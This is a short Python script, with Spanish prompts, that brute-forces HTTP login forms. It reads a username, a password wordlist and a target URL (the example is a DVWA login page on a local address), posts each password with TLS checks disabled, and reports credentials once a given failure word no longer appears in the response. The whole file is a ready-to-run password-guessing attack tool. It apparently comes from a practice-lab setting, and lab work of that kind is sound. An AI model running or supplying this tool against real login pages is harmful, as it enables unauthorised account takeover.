import requests
import time
import urllib3
requests.packages.urllib3.disable_warnings()

print("""\
-----------------------------------------------------------------------
|                  BIENVENIDO A NUESTRO PROGRAMA                      |
|               DE FUERZA BRUTA A FORMULARIOS HTTP                    |
|                    by: Joaquin Pochat                               |
-----------------------------------------------------------------------\
""")
print("")

usuario = input("Indique el usuario: ")
print("")

def funcion():
	try:
		diccionario  = input("Indique el directorio y nombre del diccionario (EXAMPLE: C:/Users/Joaquin/example.txt || /root/example.txt): ")
		print("")
		dictionary = open(diccionario, 'r')
		url = input("Copie y pegue la url del formulario: (EXAMPLE: http://192.168.0.9/dvwa/login.php): ")
		print("")
		bad_login = input('Introduzca una palabra que este en la pagina: ')

		for contraseña in dictionary:
			datos = { 'Login': 'submit', 'username' : usuario, 'password' : contraseña.strip("\n") }        ##IMPORTANTE: MODIFICAR CAMPOS SEGUN NECESIDAD
			
			respuesta = requests.post(url, data=datos, verify=False)
			
			if bad_login not in respuesta.text:
				print("""
				|---------------------------------------------------------------------|
				|                       CREDENCIALES ENCONTRADAS!                     |
				|                                                                     |
				|            Usuario:""", usuario,"""                                          | 
				|            Contraseña:""",contraseña.strip('\n'),"""                                    |
				|                                                                     |
				|---------------------------------------------------------------------|
				""")
				break
				
			print ("Se ha enviado los siguientes datos:")
			print(f"Usuario: {usuario}")
			print("Contraseña: ",contraseña.strip('\n'))
			print("")
			
	except FileNotFoundError:
		print("No se pudo encontrar el diccionario en el directorio indicado")
		print("Por favor, vuelta a intentarlo:")
		print("")
		funcion()
		
	except:
	#except Exception as e:						# ---> Permite ver el error en el codigo
		print("Se produjo un error. Consejo: verifique la pagina ingresada y vuelva a intentarlo. ")
		time.sleep(2)
		print("Cerrando el programa...")
		time.sleep(2)
		#print(f"Error: {e}")					# ---> Muestra el error del codigo
		
funcion()
